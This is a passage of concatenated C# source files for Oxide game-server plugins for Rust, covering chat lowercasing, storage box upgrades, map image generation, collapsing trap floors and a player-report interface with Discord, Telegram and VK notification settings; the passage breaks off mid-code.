            filter.Add("Reporting Performance Data");
            filter.Add("Saved ");
            filter.Add("Saving complete");
            filter.Add("TimeWarning:");
            filter.Add("but max allowed is");
            filter.Add("[event] assets/bundled/prefabs/");

            // Update filter list
            RustExtension.Filter = filter.ToArray();
        }
    }
}


// --- End of file: FilterExt.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/CapsNoCaps.cs ---
// --- Original Local Path: CapsNoCaps.cs ---

using System;
using System.Collections.Generic;
using System.Linq;
using Oxide.Game.Rust.Cui;
using UnityEngine;

namespace Oxide.Plugins
{
	[Info("CapsNoCaps", "PsychoTea", "1")]
	[Description("Turns all uppercase chat into lowercase")]
	
    public sealed class CapsNoCaps : RustPlugin
	{
        bool OnPlayerChat(ConsoleSystem.Arg arg, string player)
        {
            BasePlayer uidPlayer = (BasePlayer)arg.connection.player;
            string message = arg.GetString(0, "text");
            string uid = uidPlayer.userID.ToString();

            if (!(message[0].Equals("/")))
            {
                string lowerMessage = message.ToLower();
                ConsoleSystem.Broadcast("chat.add", uid, string.Format(uidPlayer.displayName + ": " + lowerMessage), 1.0);
                return false;
            }

            return false;
        }
	}
}

// --- End of file: CapsNoCaps.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/NewStorages.cs ---
// --- Original Local Path: NewStorages.cs ---

using System.Collections.Generic;
using System.Linq;
using Oxide.Core;

namespace Oxide.Plugins
{
    [Info("NewStorages", "Ryamkk", "1.0.0")]
    public class NewStorages : RustPlugin
    {
        private void OnServerInitialized()
        {
            var list = new List<BasePlayer>();
            list.AddRange(BasePlayer.activePlayerList);
            list.AddRange(BasePlayer.sleepingPlayerList);
            
            foreach (var player in list.ToList())
            {
                CheckAllContainers(player.userID);
            }
        }
        
        private void OnEntitySpawned(BaseNetworkable entity)
        {
            CheckEntity(entity);
        }

        private void UpgradeLargeBox(StorageContainer container)
        {
            container.inventory.capacity = 42;
            container.panelName = "genericlarge";
            container.SendNetworkUpdate();
        }
        
        private void UpgradeSmallBox(StorageContainer container)
        {
            container.inventory.capacity = 18;
            container.panelName = "largewoodbox";
            container.SendNetworkUpdate();
        }

        private void CheckAllContainers(ulong id)
        {
            foreach (var container in UnityEngine.Object.FindObjectsOfType<StorageContainer>())
            {
                if (!container.OwnerID.IsSteamId() || container.OwnerID != id) { continue; }
                if (container.PrefabName.Contains("box.wooden.large")) { UpgradeLargeBox(container); }
                if (container.PrefabName.Contains("woodenbox")) { UpgradeSmallBox(container); }
            }
        }
        
        private void CheckEntity(BaseNetworkable a)
        {
            var container = a.GetComponent<StorageContainer>();
            
            if (container == null) { return; }
            if (!container.OwnerID.IsSteamId()) { return; }
            if (container.PrefabName.Contains("box.wooden.large")) { UpgradeLargeBox(container); }
            if (container.PrefabName.Contains("woodenbox")) { UpgradeSmallBox(container); }
        }
    }
}

// --- End of file: NewStorages.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/MapGenerator.cs ---
// --- Original Local Path: MapGenerator.cs ---

﻿// Reference: System.Drawing
using System.IO;
using Oxide.Core;
using UnityEngine;
using System;
using Newtonsoft.Json;
using Random = System.Random;

namespace Oxide.Plugins
{
    [Info("MapGenerator", "TexHik", "0.1")]
    [Description("Advansed map generator")]
    class MapGenerator : RustPlugin
    {
        #region Config
        private static ConfigFile config;
        private class ConfigFile
        {
            [JsonProperty(PropertyName = "Имя генерируемого файла карты, без расширения (.jpg), если папки указаной в имени не существует, плагин будет выдавать ошибку")]
            public string filename { get; set; }

            [JsonProperty(PropertyName = "Автоматическая генерация новой карты после вайпа")]
            public bool AutoMap { get; set; }

            [JsonProperty(PropertyName = "Размер изображения для автоматической генерации карты (0 - размер по дефолту)")]
            public int autosize { get; set; }

            [JsonProperty(PropertyName = "Расширение файла (автоматическая генерация, jpg или png)")]
            public string type { get; set; }

            public static ConfigFile DefaultConfig()
            {
                return new ConfigFile
                {
                    filename = "map",
                    AutoMap = false,
                    autosize = 0,
                    type = "jpg"
                };
            }
        }
        protected override void LoadDefaultConfig()
        {
            config = ConfigFile.DefaultConfig();
            PrintWarning("Создан новый файл конфигурации. Поддержи разработчика! Вступи в группу vk.com/vkbotrust");
        }
        protected override void LoadConfig()
        {
            base.LoadConfig();
            try
            {
                config = Config.ReadObject<ConfigFile>();
                if (config == null)
                    Regenerate();
            }
            catch { Regenerate(); }
        }
        protected override void SaveConfig() => Config.WriteObject(config);
        private void Regenerate()
        {
            PrintWarning($"Конфигурационный файл 'oxide/config/{Name}.json' поврежден, создается новый...");
            LoadDefaultConfig();
        }
        #endregion

        #region Properties
        private int _mapWidth;
        private int _mapHeight;
        private Terrain _terrain;
        private bool NewWipe = false;
        #endregion

        #region Commands
        [ConsoleCommand("savemap")]
        private void SaveMapCMD(ConsoleSystem.Arg arg)
        {
            if (!arg.IsAdmin) return;
            int size = 0;
            string filetype = ".jpg";
            if (arg.HasArgs())
            {
                if (!Int32.TryParse(arg.Args[0], out size)) PrintWarning("Неправильно указан размер изображения. При генерации будет установлено дефолтное значение (размер карты / 2)");
                if (arg.Args.Length > 1 && arg.Args[1] == "png") filetype = ".png";
            }
            GenerateMap(size, filetype);
        }
        #endregion

        #region MapGenerator
        private void GenerateMap(int size = 0, string filetype = ".jpg",float brightness = 2.3f)
        {
            PrintWarning("Создается изображение карты. Сервер может подвиснуть на 5- 10 секунд!");
            TerrainMeta.HeightMap.GenerateTextures();
            Texture2D Heightmap = TerrainMeta.HeightMap.NormalTexture;


            int width = TerrainMeta.Terrain.terrainData.heightmapWidth - 1;
            int height = TerrainMeta.Terrain.terrainData.heightmapHeight - 1;

            Texture2D finalTexture = new Texture2D(width, height);
            _terrain = TerrainMeta.Terrain;

            float lowestTerrainheight = GetLowestTerrainHeight();
            float highestTerrainHeight = GetHighestTerrainHeight();

            Color waterColor = new Color(0.28f, 0.79f, 0.89f, 1f);

            for (int y = 0; y < finalTexture.height; y++)
            {
                for (int x = 0; x < finalTexture.width; x++)
                {
                    float terrainStartX = TerrainMeta.Terrain.GetPosition().x;
                    float terrainStartY = TerrainMeta.Terrain.GetPosition().z;
                    float terrainSizeX = TerrainMeta.Size.x;
                    float terrainSizeY = TerrainMeta.Size.z;
                    float terrainScaleUpX = TerrainMeta.Size.x / width;
                    float terrainScaleUpY = TerrainMeta.Size.z / height;
                    float terrainScaleDownX = width / TerrainMeta.Size.x;
                    float terrainScaleDownY = height / TerrainMeta.Size.z;
                    float startX = x * terrainScaleUpX;
                    float startY = y * terrainScaleUpY;
                    float calculatedTerrainX = startX + terrainStartX;
                    float calculatedTerrainY = startY + terrainStartY;
                    Vector3 terrainWorldPosition = new Vector3(calculatedTerrainX, 0, calculatedTerrainY);
                    float waterDepth = TerrainMeta.WaterMap.GetDepth(terrainWorldPosition);
                    float terrainHeight = _terrain.terrainData.GetHeight(x, y) - lowestTerrainheight;
                    float currentHeight = terrainHeight / (highestTerrainHeight - lowestTerrainheight);



					if (currentHeight>=waterDepth) {
                        Color pixelColor = TerrainMeta.Colors.GetColor(terrainWorldPosition, -1);
                        pixelColor.a = TerrainMeta.AlphaMap.GetAlpha(x, y);
                        finalTexture.SetPixel(x, y, pixelColor);
					} else {
                        Color pixelColor = TerrainMeta.Colors.GetColor(terrainWorldPosition, 0);
                        pixelColor.a = TerrainMeta.AlphaMap.GetAlpha(x, y);
                        finalTexture.SetPixel(x, y, pixelColor);
					}



                    if (Heightmap != null)
                    {
                        var finalTextureColor = finalTexture.GetPixel(x, y);
                        var heightmapNormalTextureColor = Heightmap.GetPixel(x, y);
                        var alphaBlendedColor = AdvBlend(heightmapNormalTextureColor, finalTextureColor);
						
						
						float h, s, v;
						Color.RGBToHSV(alphaBlendedColor, out h, out s, out v);
						// Modify the HSV color to be brighter
						s *= brightness;
						v *= 1.0f;
						// Convert it back to RGB
						alphaBlendedColor = Color.HSVToRGB(h, s, v);
						finalTexture.SetPixel(x, y, alphaBlendedColor);
						
						
                            if (currentHeight<waterDepth)
                            {
								Color waterColor2 = alphaBlendedColor;
                                waterColor2 = new Color(waterColor.r, waterColor.g, waterColor.b, Sigma(waterDepth/50.0f));

                                    var alphaBlendedColor2 = AdvBlend(waterColor2, finalTextureColor);
                                    finalTexture.SetPixel(x, y, alphaBlendedColor2);
                            }
                    }
					
					


                }
            }
            finalTexture.Apply();
            SaveIMG(finalTexture, size, filetype);
            UnityEngine.Object.Destroy(finalTexture);
        }

        private float Sigma(float a) {return float.Parse((1 / (1 + Math.Pow(Math.E, -13.0f*(a-0.03f)))).ToString());}  //{return float.Parse((1 / (1 + Math.Pow(Math.E, -12.0f*(a-0.15)))).ToString());}
        private Color Sigma(Color a) { return new Color(Sigma(a.r), Sigma(a.g), Sigma(a.b),a.a); }


        private float Parab(float a) { return float.Parse((2.0f / (1 + Math.Pow(2.9f, Math.Pow(a - 25.0f, 2) / 520.0f))).ToString()); } //   (2.0f/(1 + Math.Pow(2.9f,Math.Pow(a - 25.0f, 2)/120.0f)))
        private Color Parab(Color a) { return new Color(Parab(a.r), Parab(a.g), Parab(a.b), a.a); }

        private float GetLowestTerrainHeight()
        {
            float lowestHeight = TerrainMeta.Size.y;
            for (var x = 0; x < TerrainMeta.Size.x; x++)
            {
                for (var y = 0; y < TerrainMeta.Size.z; y++)
                {
                    var h = _terrain.terrainData.GetHeight(x, y);
                    if (h < lowestHeight) lowestHeight = h;
                }
            }
            return lowestHeight;
        }
        private float GetHighestTerrainHeight()
        {
            float highestHeight = 0;
            for (var x = 0; x < TerrainMeta.Size.x; x++)
            {
                for (var y = 0; y < TerrainMeta.Size.z; y++)
                {
                    var h = _terrain.terrainData.GetHeight(x, y);
                    if (h > highestHeight) highestHeight = h;
                }
            }
            return highestHeight;
        }


        public Color AdvBlend(Color a, Color b)
        {
            Color col = new Color();
            col = b * (1.0f - a.a) + a * a.a;
            return col;
        }


        private void SaveIMG(Texture2D texture, int size = 0, string filetype = ".jpg")
        {
            if (filetype != ".jpg" && filetype != ".png") return;
            byte[] bytes = null;
            if (filetype == ".jpg") bytes = texture.EncodeToJPG();
            if (filetype == ".png") bytes = texture.EncodeToPNG();
            if (bytes == null) return;
            Stream stream = new MemoryStream(bytes);
            System.Drawing.Image mapimage = System.Drawing.Image.FromStream(stream);
            if (size != 0 && size != mapimage.Height)
            {
                System.Drawing.Image.GetThumbnailImageAbort myCallback = new System.Drawing.Image.GetThumbnailImageAbort(ThumbnailCallback);
                mapimage = mapimage.GetThumbnailImage(size, size, myCallback, IntPtr.Zero);
            }
            if (filetype == ".jpg") mapimage.Save(Interface.Oxide.DataDirectory + Path.DirectorySeparatorChar + "RustMap" + Path.DirectorySeparatorChar + "Map" + filetype, System.Drawing.Imaging.ImageFormat.Jpeg);
            if (filetype == ".png") mapimage.Save(Interface.Oxide.DataDirectory + Path.DirectorySeparatorChar + config.filename + filetype, System.Drawing.Imaging.ImageFormat.Png);
            PrintWarning($"Изображение карты размером {mapimage.Height}px сохранено: {Interface.Oxide.DataDirectory + Path.DirectorySeparatorChar}RustMap{Path.DirectorySeparatorChar + config.filename + filetype}");
        }

        public bool ThumbnailCallback()
        {
            return false;
        }
        #endregion

        #region OxideHooks
        void OnNewSave(string filename)
        {
			NewWipe = true;
        }
        void OnServerInitialized()
        {
            if (NewWipe) Server.Command($"savemap");
        }
        #endregion
    }
}

// --- End of file: MapGenerator.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/TrapFloors.cs ---
// --- Original Local Path: TrapFloors.cs ---

using System;
using System.Collections.Generic;
using System.Linq;
using Oxide.Core;
using Oxide.Core.Configuration;

using Rust;
using UnityEngine;

using IEnumerator = System.Collections.IEnumerator;

namespace Oxide.Plugins
{
    [Info("TrapFloors", "Cheeze", "1.2", ResourceId = 2038)]
    [Description("Allows players to make trap floors that collapse on non cupboard authorised players")]

    class TrapFloors : RustPlugin
    {
        static readonly DynamicConfigFile DataFile = Interface.Oxide.DataFileSystem.GetFile("TrapFloors");
        static List<Floor> trapFloors = new List<Floor>();
        const string permAdmin = "trapfloors.admin";
        BaseEntity newTrapFloor;

        class Floor
        {
            public uint Id;
            public string Location;
            public ulong PlayerId;
            internal static Floor GetTrap(uint id) => trapFloors.First(x => x.Id == id);
        }

        protected override void LoadDefaultConfig()
        {
            Config["MaxFloors"] = 1;
            Config["EnableFoundationTraps"] = true;
            SaveConfig();
        }

        void Init()
        {
            LoadDefaultMessages();
            trapFloors = DataFile.ReadObject<List<Floor>>();
            permission.RegisterPermission(permAdmin, this);
        }

        void OnServerInitialized()
        {
            foreach (var ent in UnityEngine.Object.FindObjectsOfType<BaseEntity>())
            {
                if (trapFloors.All(x => x.Id != ent.net.ID)) continue;
                newTrapFloor.gameObject.AddComponent<FloorTrap>();
                ent.gameObject.AddComponent<FloorTrap>();
            }
        }

        void LoadDefaultMessages()
        {
            var messages = new Dictionary<string, string>
            {
                ["ADMIN_BAD_SYNTAX"] = "Invalid, use /trapfloor add/remove/list/wipe",
                ["ADMIN_ONLY"] = "That command is for admins only",
                ["BAD_SYNTAX"] = "Incorrect Syntax, /trapfloor add",
                ["END_LIST"] = "End of Trap Floor List",
                ["FLOOR_EXISTS"] = "There is already a floor stored with the same ID",
                ["FLOOR_LIST"] = "Floor ID: {0}, Floor Location: {1}, Player ID: {2}",
                ["FLOOR_SET"] = "Trap Floor set! You have set {0} out of {1} available trap floors",
                ["INSTRUCTIONS"] = "Use: /trapfloor remove <id> || Trap List: /trapfloor list ",
                ["LIST"] = "Trap Floor List",
                ["MAX_REACHED"] = "Cannot create TrapFloor, you have reached the maximum of {0} TrapFloors",
                ["NOT_FLOOR"] = "This is not a floor",
                ["NO_BUILD"] = "You are not authorised here",
                ["NO_FLOOR"] = "No floor detected",
                ["NO_PERMISSION"] = "Sorry, you are not authorised to use this",
                ["REMOVED"] = "Trap floor removed with floor ID: {0}",
                ["WIPED"] = "Trap floors wiped!",
                ["NO_FOUNDATION"] = "You cannot set foundations as traps"
            };
            lang.RegisterMessages(messages, this);
        }

        void OnServerSave() => SaveData();

        void Unloaded()
        {
            foreach (var floor in UnityEngine.Object.FindObjectsOfType<FloorTrap>())
                UnityEngine.Object.Destroy(floor);
        }

        string pName = "<color=orange>TrapFloors:</color> ";

        #region ColliderCheck

        class FloorTrap : MonoBehaviour
        {
            void Awake()
            {
                gameObject.name = "FloorTrap";
                gameObject.layer = (int)Layer.Reserved1;

                var rigidbody = gameObject.GetComponent<Rigidbody>() ?? gameObject.AddComponent<Rigidbody>();

                rigidbody.useGravity = false;
                rigidbody.isKinematic = true;
                rigidbody.detectCollisions = true;
                rigidbody.collisionDetectionMode = CollisionDetectionMode.Discrete;

                UpdateCollider();
            }

            void UpdateCollider()
            {
                var collider = gameObject.GetComponent<BoxCollider>() ?? gameObject.AddComponent<BoxCollider>();
                collider.size = new Vector3(1.5f, 0.25f, 1.5f);
                collider.isTrigger = true;
                collider.enabled = true;
            }

            void OnTriggerEnter(Collider col)
            {
                if (!(col.gameObject.ToBaseEntity() is BasePlayer)) return;
                var player = (BasePlayer)col.gameObject.ToBaseEntity();

                if (player.CanBuild()) return;

                StartCoroutine(KillIt(gameObject.ToBaseEntity()));
                trapFloors.Remove(Floor.GetTrap(gameObject.ToBaseEntity().net.ID));
                SaveData();

                Effect.server.Run("assets/bundled/prefabs/fx/build/repair_failed.prefab", player.transform.position, Vector3.zero, null, true);
            }

            IEnumerator KillIt(BaseEntity ent)
            {
                yield return new WaitForSeconds(0.4f);

                if (!ent.isDestroyed)
                    ent.Kill(BaseNetworkable.DestroyMode.Gib);
            }
        }

        #endregion Collider Check

        void OnEntityDeath(BaseCombatEntity entity)
        {
            if (!(entity is BuildingBlock)) return;
            if ((!entity.name.Contains("floor/floor") || (!entity.name.Contains("foundation")) && (trapFloors.All(x => x.Id != entity.net.ID)))) return;

            trapFloors.Remove(Floor.GetTrap(Convert.ToUInt32(entity.net.ID)));
            SaveData();
        }

        [ChatCommand("trapfloor")]
        void cmdAddTrapFloor(BasePlayer player, string command, string[] args)
        {
            if (args.Length == 0)
            {
                PrintToChat(player, pName + LangMsg("BAD_SYNTAX", player.UserIDString));
                return;
            }

            if ((args[0] == "add") || (args[0] != "remove") || (args[0] != "wipe") || (args[0] != "list"))
            {
                switch (args[0])
                {
                    case "add":
                        if (!player.CanBuild())
                        {
                            PrintToChat(player, pName + LangMsg("NO_BUILD", player.UserIDString));
                            return;
                        }

                        int amount = trapFloors.Count(x => x.PlayerId == player.userID);
                        Int32 max = Convert.ToInt32(Config["MaxFloors"]);
                        bool useFoundations = Convert.ToBoolean(Config["EnableFoundationTraps"]); 
                        if (amount < max)
                        {
                            RaycastHit hit;

                            if (Physics.Raycast(player.eyes.HeadRay(), out hit, Mathf.Infinity)) newTrapFloor = hit.GetTransform().gameObject.ToBaseEntity();

                            if (newTrapFloor == null)
                            {
                                PrintToChat(player, pName + LangMsg("NO_FLOOR", player.UserIDString));
                                return;
                            }

                            if (trapFloors.Any(x => x.Id == newTrapFloor.net.ID))
                            {
                                PrintToChat(player, pName + LangMsg("FLOOR_EXISTS", player.UserIDString));
                                return;
                            }

                            if ((!newTrapFloor.name.Contains("floor")) && (!newTrapFloor.name.Contains("foundation")))
                            {
                                PrintToChat(player, pName + LangMsg("NOT_FLOOR", player.UserIDString));
                                return;
                            }

                            if (newTrapFloor.name.Contains("foundation") && !useFoundations)
                            {
                                PrintToChat(player, pName + LangMsg("NO_FOUNDATION", player.UserIDString));
                                return;
                            }

                            var info = new Floor()
                            {
                                Id = newTrapFloor.net.ID,
                                Location = newTrapFloor.transform.position.ToString(),
                                PlayerId = player.userID
                            };

                            trapFloors.Add(info);
                            amount = trapFloors.Count(x => x.PlayerId == player.userID);
                            PrintToChat(player, pName + LangMsg("FLOOR_SET", player.UserIDString, amount, max));
                            newTrapFloor.gameObject.AddComponent<FloorTrap>();
                        }
                        else
                        {
                            PrintToChat(player, pName + LangMsg("MAX_REACHED", player.UserIDString, max));
                        }
                        break;

                    case "remove":
                        if (!HasPermission(player, permAdmin))
                        {
                            PrintToChat(player, pName + LangMsg("ADMIN_ONLY", player.UserIDString));
                            return;
                        }
                        if (args.Length < 2)
                        {
                            PrintToChat(player, pName + LangMsg("INSTRUCTIONS", player.UserIDString));
                            return;
                        }
                        if (Floor.GetTrap(Convert.ToUInt32(args[1])) != null)
                            trapFloors.Remove(Floor.GetTrap(Convert.ToUInt32(args[1])));
                        player.ChatMessage(LangMsg("REMOVED", player.UserIDString, args[1]));
                        break;

                    case "list":
                        if (!HasPermission(player, permAdmin))
                        {
                            PrintToChat(player, pName + LangMsg("ADMIN_ONLY", player.UserIDString));
                            return;
                        }
                        PrintToChat(player, pName + LangMsg("LIST", player.UserIDString));
                        foreach (var floor in trapFloors)
                            player.ChatMessage(LangMsg("FLOOR_LIST", player.UserIDString, floor.Id, floor.Location, floor.PlayerId));
                        PrintToChat(player, pName + LangMsg("END_LIST", player.UserIDString));
                        break;

                    case "wipe":
                        if (!HasPermission(player, permAdmin))
                        {
                            PrintToChat(player, pName + LangMsg("ADMIN_ONLY", player.UserIDString));
                            return;
                        }
                        trapFloors.Clear();
                        PrintToChat(player, pName + LangMsg("WIPED", player.UserIDString));
                        break;

                    case "default":
                        PrintToChat(player, pName + LangMsg("BAD_SYNTAX", player.UserIDString));
                        break;

                }
                SaveData();
            }
            else
            {
                PrintToChat(player, LangMsg("ADMIN_BAD_SYNTAX", player.UserIDString));
            }
        }

        void Remove(string args, BasePlayer player)
        {
            if (Floor.GetTrap(Convert.ToUInt32(args[1])) != null)
                trapFloors.Remove(Floor.GetTrap(Convert.ToUInt32(args[1])));
            player.ChatMessage(LangMsg("REMOVED", player.UserIDString, args[1]));
        }

        bool HasPermission(BasePlayer player, string perm) => permission.UserHasPermission(player.UserIDString, perm);

        string LangMsg(string key, string uid = null, params object[] args) => string.Format(lang.GetMessage(key, this, uid), args);

        static void SaveData() => DataFile.WriteObject(trapFloors);
    }
}


// --- End of file: TrapFloors.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/SoReport.cs ---
// --- Original Local Path: SoReport.cs ---

﻿using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using Facepunch.Extend;
using Newtonsoft.Json;
using Oxide.Core;
using Oxide.Core.Libraries;
using Oxide.Core.Plugins;
using Oxide.Game.Rust.Cui;
using UnityEngine;

namespace Oxide.Plugins
{
    [Info("SoReport", "https://topplugin.ru/", "1.0.1")]
    public class SoReport : RustPlugin
    {
        #region Data

        private ConfigData cfg { get; set; }

        private class ConfigData
        {
            [JsonProperty("Название сервера")] public string Lable;
            [JsonProperty("Включить дискорд?")] public bool discord;

            [JsonProperty("Dircord Report WebHook")]
            public string discordhook;

            [JsonProperty("Dircord PlayerSayDiscord WebHook")]
            public string discordhook2;
            [JsonProperty("Отправлять ли уведомления в телеграмм ?")]
            public bool TelegramUse = false; 
            [JsonProperty("Название чата(Пригласить своего бота в чат)")]
            public string chatid = "НАЗВАНИЕ ЧАТА";
            [JsonProperty("Создать своего бота через BotFather и скопировать сюда токен")]
            public string botToken = "ТОКЕН";
            [JsonProperty("Отправлять ли уведомления в вконтакте ?")]
            public bool Vkontakte = false;
            [JsonProperty("Вк админа")] public string vkadmin = "";
            [JsonProperty("VK Token группы")]
            public string vkAcces = "";

            [JsonProperty("Cooldown")] public int cooldown;
            [JsonProperty("Причина 1")] public string res1 = "МАКРОСЫ";
            [JsonProperty("Причина 2")] public string res2 = "ЧЭТЫ";
            [JsonProperty("Причина 3")] public string res3 = "БАГОЮЗ";
            [JsonProperty("Причина 4")] public string res4 = "+3";

 
            [JsonProperty("Кол-во репортов для появление в панели модератора")]
            public int kolreport = 2;

            [JsonProperty("Кол-во репортов для подсветки красный в панели модератора")]
            public int redcolor = 10;

            [JsonProperty("Кол-во проверки для подсветки зеленым в панели модератора")]
            public int greencolor = 3;

            public static ConfigData GetNewConf()
            {
                var newConfig = new ConfigData();
                newConfig.Lable = "SoReport";
                newConfig.discord = false;
                newConfig.cooldown = 30; 
                newConfig.discordhook = "";
                newConfig.discordhook2 = "";
                return newConfig;
            }
        }

        protected override void LoadDefaultConfig()
        {
            cfg = ConfigData.GetNewConf();
        }

        protected override void SaveConfig()
        {
            Config.WriteObject(cfg);
        }

        protected override void LoadConfig()
        {
            base.LoadConfig();
            try
            {
                cfg = Config.ReadObject<ConfigData>();
            }
            catch
            {
                LoadDefaultConfig();
            }

            NextTick(SaveConfig);
        }

        Dictionary<ulong, PlayerData> _playerData = new Dictionary<ulong, PlayerData>();

        class PlayerData
        {
            public string UserName;
            public int ReportCount;
            public int AlertCount;
            public double ReportCD = CurrentTime();
            public double IsCooldown => Math.Max(ReportCD - CurrentTime(), 0);
        }

        #endregion
        #region UI

        private static string Layer = "UiSoReport";
        private string Hud = "Hud";
        private string Overlay = "Overlay";
        private string regular = "robotocondensed-regular.ttf";
        private static string Sharp = "assets/content/ui/ui.background.tile.psd";
        private static string Blur = "assets/content/ui/uibackgroundblur.mat";
        private string radial = "assets/content/ui/ui.background.transparent.radial.psd";

        private CuiPanel _fon = new CuiPanel()
        {
            RectTransform = {AnchorMin = "0 0", AnchorMax = "1 1"},
            Image = {Color = "0 0 0 0.87", Material = "assets/content/ui/uibackgroundblur.mat"}
        };

        private CuiPanel _mainFon = new CuiPanel()
        {
            RectTransform =
                {AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-1920 -1080", OffsetMax = "1920 1080"},
            CursorEnabled = true,
            Image = {Color = "0.211200 0.2312312 0.312312312 0"}
        };

        private CuiPanel _redPanel = new CuiPanel()
        {
            RectTransform = {AnchorMin = "0.4189235 0.3333334", AnchorMax = "0.4930556 0.666358"},
            Image = {Color = HexToRustFormat("#82433bCC")}
        };

        private CuiPanel _modPanel = new CuiPanel()
        {
            RectTransform = {AnchorMin = "0.333513 0.3333334", AnchorMax = "0.4076451 0.666358"},
            Image = {Color = HexToRustFormat("#222222CC")}
        };
        private CuiPanel _mod2Panel = new CuiPanel()
        {
            RectTransform = {AnchorMin = "0.333513 0.3333334", AnchorMax = "0.4076451 0.666358"},
            Image = {Color = HexToRustFormat("#222222CC"), Material = Blur }
        };
        private CuiPanel _playersPanel = new CuiPanel()
        {
            RectTransform = {AnchorMin = "0.4933972 0.3333334", AnchorMax = "0.6559027 0.666358"},
            Image = {Color = HexToRustFormat("#222222CC")}
        };

        private CuiButton _close = new CuiButton()
        {
            RectTransform = {AnchorMin = "0.6567709 0.6496913", AnchorMax = "0.6659723 0.6645062"},
            Button = {Close = Layer, Sprite = "assets/icons/vote_down.png", Color = "0.64 0.64 0.64 0.86",},
            Text = {Text = ""}
        };

        [ChatCommand("report")]
        private void StartUi(BasePlayer player)
        {
            var cont = new CuiElementContainer();
            cont.Add(_fon, Overlay, Layer);
            cont.Add(_mainFon, Layer, Layer + "Main");
            cont.Add(_close, Layer + "Main");
            if (permission.UserHasPermission(player.UserIDString, "soreport.admin"))
                cont.Add(new CuiButton()
                {
                    Text = {Text = "МОДЕРАТОР ПАНЕЛЬ", Align = TextAnchor.MiddleCenter},
                    Button = {Color = "0.64 0.64 0.64 0.35", Command = "uisoreport modmenu open"},
                    RectTransform = {AnchorMin = "0.384375 0.6555555", AnchorMax = "0.41875 0.6654318"}
                }, Layer + "Main", Layer + "BMod");
            CuiHelper.AddUi(player, cont);
            PlayerListLoad(player, 1);
            ReportFon(player);
        }

        private void Alert(ulong targetId)
        {
            var targetPlayer = BasePlayer.FindByID(targetId);
            if (targetPlayer == null) return;
            var cont = new CuiElementContainer();
            cont.Add(new CuiPanel()
            {
                RectTransform =
                    {AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-300 250", OffsetMax = "300 300"},
                Image = {Color = "0 0 0 0.64", Material = Blur}
            }, Overlay, "AlerUISo");
            cont.Add(new CuiElement()
            {
                Parent = "AlerUISo",
                Components =
                {
                    new CuiTextComponent()
                    {
                        Align = TextAnchor.MiddleCenter,
                        Text =
                            "Вас вызвали на проверку напиши ваш дискорд /discord <color=purple>{ВАШ ДИСКОРД}</color>.Если вы покините сервер вы будете наказаны,за отказ вы тоже будете наказаны!"
                    },
                    new CuiRectTransformComponent() {AnchorMin = "0.09 0", AnchorMax = "0.9 1"}
                }
            });
            CuiHelper.AddUi(targetPlayer, cont);
        }

        private void ModeratorInterface(BasePlayer player, int page)
        {
            var cont = new CuiElementContainer();
            List<ulong> f;
            CuiHelper.DestroyUi(player, Layer + "Mod");
            cont.Add(_modPanel, Layer + "Main", Layer + "Mod");
            //Лейбл
            PlayerData playerData;
            if (!_playerData.TryGetValue(player.userID, out playerData)) return;
            if (page > 1)
            {
                cont.Add(new CuiButton()
                {
                    Button =
                        {Command = $"uisoreport nextpage mod {page - 1}", Color = HexToRustFormat("#4b602aCC")},
                    Text = {Text = "<", Color = HexToRustFormat("#a1e432"), Align = TextAnchor.MiddleCenter},
                    RectTransform = {AnchorMin = "0.4305381 0.01297505", AnchorMax = "0.4722021 0.05097298"}
                }, Layer + "Mod");
            }
            else
            {
                cont.Add(new CuiButton()
                {
                    Button = {Command = $"", Color = HexToRustFormat($"#24291dCC")},
                    Text = {Text = "<", Color = HexToRustFormat("#a1e432"), Align = TextAnchor.MiddleCenter},
                    RectTransform = {AnchorMin = "0.4305381 0.01297505", AnchorMax = "0.4722021 0.05097298"}
                }, Layer + "Mod");
            }

            cont.Add(new CuiButton()
            {
                Button = {Color = "0 0 0 0.64"},
                Text =
                    {Text = page.ToString(), Color = HexToRustFormat("#a1e432"), Align = TextAnchor.MiddleCenter},
                RectTransform = {AnchorMin = "0.4786112 0.01297505", AnchorMax = "0.5202752 0.05097298"}
            }, Layer + "Mod");
            cont.Add(new CuiButton()
            {
                Button = {Command = $"uisoreport nextpage mod {page + 1}", Color = HexToRustFormat("#4b602aCC")},
                Text = {Text = ">", Color = HexToRustFormat("#a1e432"), Align = TextAnchor.MiddleCenter},
                RectTransform = {AnchorMin = "0.5256162 0.01297505", AnchorMax = "0.5672802 0.05097298"}
            }, Layer + "Mod");
            cont.Add(new CuiElement()
            {
                Parent = Layer + "Mod",
                Components =
                {
                    new CuiTextComponent() {Text = "МОДЕРАТОР", Color = "0.64 0.64 0.64 0.86", FontSize = 30},
                    new CuiRectTransformComponent()
                        {AnchorMin = "0.03044713 0.9258574", AnchorMax = "0.9742392 0.9766592"}
                }
            });
            foreach (var players in _playerData.Where(p => p.Value.ReportCount >= cfg.kolreport)
                .Where(p => BasePlayer.FindByID(p.Key) != null)
                .Select((i, t) => new {A = i, B = t - (page - 1) * 15}).Skip((page - 1) * 15).Take(15))
            {
                var target = BasePlayer.FindByID(players.A.Key);
                if (players.A.Value.AlertCount >= cfg.greencolor)
                {
                    cont.Add(new CuiElement()
                    {
                        Parent = Layer + "Mod",
                        Name = Layer + "Mod" + players.B,
                        Components =
                        {
                            new CuiImageComponent()
                            {
                                Color = "0.00 0.78 0.00 0.25",
                            },
                            new CuiRectTransformComponent
                            {
                                AnchorMin =
                                    $"{0.03278887} {0.8387395 - Math.Floor((double) players.B / 1) * 0.058}",
                                AnchorMax = $"{0.976581} {0.8923218 - Math.Floor((double) players.B / 1) * 0.058}"
                            }
                        }
                    });
                }
                else if (players.A.Value.ReportCount >= cfg.redcolor)
                {
                    cont.Add(new CuiElement()
                    {
                        Parent = Layer + "Mod",
                        Name = Layer + "Mod" + players.B,
                        Components =
                        {
                            new CuiImageComponent()
                            {
                                Color = "0.50 0.00 0.00 0.35",
                            },
                            new CuiRectTransformComponent
                            {
                                AnchorMin =
